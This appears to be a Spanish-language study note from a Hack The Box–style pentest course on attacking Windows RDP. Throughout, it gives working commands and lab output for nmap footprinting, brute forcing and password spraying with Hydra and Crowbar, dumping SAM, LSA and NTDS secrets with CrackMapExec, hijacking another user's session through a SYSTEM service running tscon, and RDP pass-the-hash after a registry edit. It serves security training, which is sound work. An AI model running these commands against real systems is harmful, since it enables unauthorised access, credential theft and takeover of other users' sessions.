> El **Remote Desktop Protocol (RDP)** es un protocolo desarrollado por Microsoft para el acceso remoto a una computadora con el sistema operativo Windows. Este protocolo permite transmitir comandos de visualización y control a través de la interfaz gráfica de usuario (GUI) de forma cifrada sobre redes IP. RDP trabaja en la capa de aplicación del modelo de referencia TCP/IP, utilizando típicamente el puerto TCP 3389 como protocolo de transporte. Sin embargo, el protocolo UDP sin conexión también puede utilizar el puerto 3389 para administración remota.

Para establecer una sesión RDP, tanto el firewall de la red como el firewall del servidor deben permitir conexiones externas. Si se usa **Network Address Translation (NAT)** entre el cliente y el servidor, el equipo remoto necesita la dirección IP pública para acceder al servidor, y además se debe configurar el **port forwarding** en el router NAT hacia el servidor.

El servicio de **Escritorio Remoto** está instalado por defecto en los servidores Windows y no requiere aplicaciones externas adicionales. Este servicio puede ser activado mediante el Administrador del Servidor y tiene la configuración predeterminada para permitir conexiones solo a los hosts con **Autenticación a Nivel de Red (NLA)**.
### Footprinting a RDP

Escaneando el servicio RDP puede darnos mucha información sobre el host. Por ejemplo, podemos determinar si NLA está habilitado en el servidor o no, la versión de producto y el hostname.

#### Usando nmap

```shell-session
amr251@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET
Nmap scan report for 10.129.201.248
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```

Además, podemos usar `--packet-trace` para seguir los paquetes individuales e inspeccionar su contenido de forma manual. Podemos ver que `RDP cookies` (`mstshash=nmap`) usado por nmap para interactuar con el servidor RDP puede ser identificado por cazadores de amenazas y varios servicios de seguridad como EDR, y pueden echarnos como pentesters en redes reforzadas. Un script denominado [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) ha sido desarrollado por Cisco y puede identificar las configuraciones de servidores RDP sin autenticarse mediante handshakes.

La autenticación a dichos servidores RDP puede realizarse de muchas formas. Por ejemplo, podemos conectarnos a servidores RDP desde Linux usando `xfreerdp`, `rdesktop`, o `Remmina` e interactuar con la GUI del servidor:

```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248 /dynamic-resolution
```

### RDP - Ataques a contraseñas

| **Command**                                                            | **Description**                                                                                                                                                                                          |
| ---------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `crackmapexec winrm <ip> -u user.list -p password.list`                | Usa CrackMapExec sobre WinRM para intentar hacer fuerza bruta en usuarios y contraseñas específicas                                                                                                      |
| `crackmapexec smb <ip> -u "user" -p "password" --shares`               | Usa CrackMapExec para enumerar shares SMB en un objetivo                                                                                                                                                 |
| `hydra -L user.list -P password.list <service>://<ip>`                 | Utiliza Hydra junto con una lista de usuarios y una lista de contraseñas para intentar descifrar una contraseña en el servicio especificado                                                              |
| `hydra -l username -P password.list <service>://<ip>`                  | Utiliza Hydra junto con una lista de nombres de usuario y contraseñas para intentar descifrar una contraseña en el servicio especificado.                                                                |
| `hydra -l user.list -p password <service>://<ip>`                      | Utiliza Hydra junto con una lista de usuarios y una contraseña para intentar descifrar una contraseña en el servicio especificado.                                                                       |
| `hydra -C <user_pass.list> ssh://<IP>`                                 | Utiliza Hydra junto con una lista de credenciales para intentar iniciar sesión en un objetivo a través del servicio especificado. Esto puede utilizarse para intentar un ataque de robo de credenciales. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Utiliza CrackMapExec junto con las credenciales de administrador para volcar los hashes de contraseñas almacenados en SAM a través de la red.                                                            |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Utiliza CrackMapExec junto con las credenciales de administrador para volcar secretos de LSA a través de la red. De esta manera, es posible obtener credenciales sin cifrar.                             |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds`             | Utiliza CrackMapExec junto con las credenciales de administrador para volcar hashes del archivo ntds a través de una red                                                                                 |
| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"`            | Utiliza Evil-WinRM para establecer una sesión de PowerShell con un objetivo de Windows mediante un hash de usuario y contraseña. Este es un tipo de ataque `Pass-The-Hash`.                              |

Podemos usar [Crowbar](https://github.com/galkan/crowbar) para realizar un ataque de spray de contraseñas sobre un servicio RDP. Teniendo una lista de usuarios y una contraseña:

```shell-session
amr251@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

O `Hydra` para el mismo tipo de ataque:

```shell-session
amr251@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
...
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
```

Y entonces ya podemos iniciar sesión

```shell-session
rdesktop -u admin -p password123 192.168.2.143
```

### Ataques específicos del protocolo RDP

Imaginemos que logramos acceder exitosamente a una máquina y tenemos una cuenta con privilegios de administrador local. Si un usuario está conectado mediante RDP a nuestra máquina comprometida, podemos secuestrar la sesión de escritorio remoto de ese usuario para **escalar privilegios** e **imitar la cuenta**. En un entorno de Active Directory, esto podría permitirnos tomar control de una cuenta de **Administrador de Dominio** o ampliar aún más nuestro acceso dentro del dominio.
##### Secuestro de Sesión RDP

Como se muestra en el siguiente ejemplo, estamos conectados como el usuario **juurena** (UserID = 2), quien tiene privilegios de administrador. Nuestro objetivo es secuestrar la sesión del usuario **lewen** (UserID = 4), quien también está conectado mediante RDP.

![[usuarios_windows.png| 800]]

Para suplantar exitosamente a un usuario sin su contraseña, necesitamos tener privilegios de `SYSTEM` y usar `tscon.exe` (Binario de Microsoft) que permite a los usuarios conectarse a otra sesión de escritorio. Esto funciona especificando a qué **ID de SESIÓN** (en nuestro ejemplo, el 4 correspondiente a la sesión de **lewen**) queremos conectarnos, y a qué **nombre de sesión** (por ejemplo, **rdp-tcp#13**, que corresponde a nuestra sesión actual).

Por ejemplo, el siguiente comando abrirá una nueva consola como la **SESSION_ID** especificada, dentro de nuestra sesión RDP actual:

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Si tenemos privilegios de **administrador local**, podemos utilizar varios métodos para obtener privilegios de **SYSTEM**, como **PsExec** o **Mimikatz**.

Un truco sencillo consiste en **crear un servicio de Windows**, ya que por defecto este se ejecutará como **Local System** y podrá ejecutar cualquier binario con privilegios de **SYSTEM**. Utilizaremos el binario de Microsoft **`sc.exe`**. Primero, especificamos el **nombre del servicio** (`sessionhijack`) y el **binpath**, que es el comando que queremos ejecutar.

Una vez que ejecutemos el siguiente comando, se creará un servicio llamado **sessionhijack**:

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![[usuarios_windows2.png]]

Para ejecutar el comando, podemos empezar el servicio `sessionhijack`:

```cmd-session
C:\htb> net start sessionhijack
```

Una vez que el servicio ha comenzado, aparecerá una nueva terminal con la sesión de usuario `lewen`. Con esta nueva cuenta, podemos intentar descubrir qué tipo de privilegios tiene en la red, y quizá si tenemos suerte, el usuario es miembro del grupo Help Desk con derechos de admin en varios hosts y incluso un dominio de administrador. 

![[usuarios_windows3.png| 700]]

> *Esto ya no funciona en Server 2019*

### RDP Pass-The-Hash (PtH)

Durante una prueba de penetración, puede que necesitemos acceder a aplicaciones o software instalados en el sistema Windows de un usuario que **solo están disponibles mediante acceso gráfico (GUI)**. Si tenemos las **credenciales en texto claro** del usuario objetivo, no hay problema: simplemente realizamos una conexión RDP al sistema.

Sin embargo, ¿qué sucede si **solo disponemos del hash NTLM** del usuario (por ejemplo, obtenido mediante un ataque de volcado de credenciales como el de la base de datos **SAM**) y **no pudimos crackearlo** para obtener la contraseña en texto claro? En algunos casos, podemos realizar un ataque **RDP Pass-the-Hash (PtH)** para obtener acceso gráfico (GUI) al sistema objetivo usando herramientas como **xfreerdp**.

Hay algunas advertencias importantes a tener en cuenta para este tipo de ataque:

- El **modo de administración restringido (Restricted Admin Mode)**, que está **deshabilitado por defecto**, debe estar **habilitado en el host de destino**. De lo contrario, al intentar la conexión, se nos mostrará el siguiente error:

![[account_restrictions.png| 500]]

Esto puede ser habilitado añadiendo una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. Se puede encontrar con el siguiente comando:

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![[LSA2.png]]

Una vez la clave de registro ha sido añadida, podemos usar `xfreerdp3` con la opción `/pth` para ganar acceso RDP, siendo el valor adherido a `/pth` el hash NTLM obtenido previamente.

```shell-session
amr251@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

Hay que tener en cuenta que esto **no funcionará contra todos los sistemas Windows** que encontremos, pero **siempre vale la pena intentarlo** cuando:

- Tenemos un **hash NTLM**
- Sabemos que el **usuario tiene permisos de RDP** sobre una máquina o conjunto de máquinas    
- El **acceso gráfico (GUI)** podría beneficiarnos de alguna forma para alcanzar el objetivo de nuestra evaluación.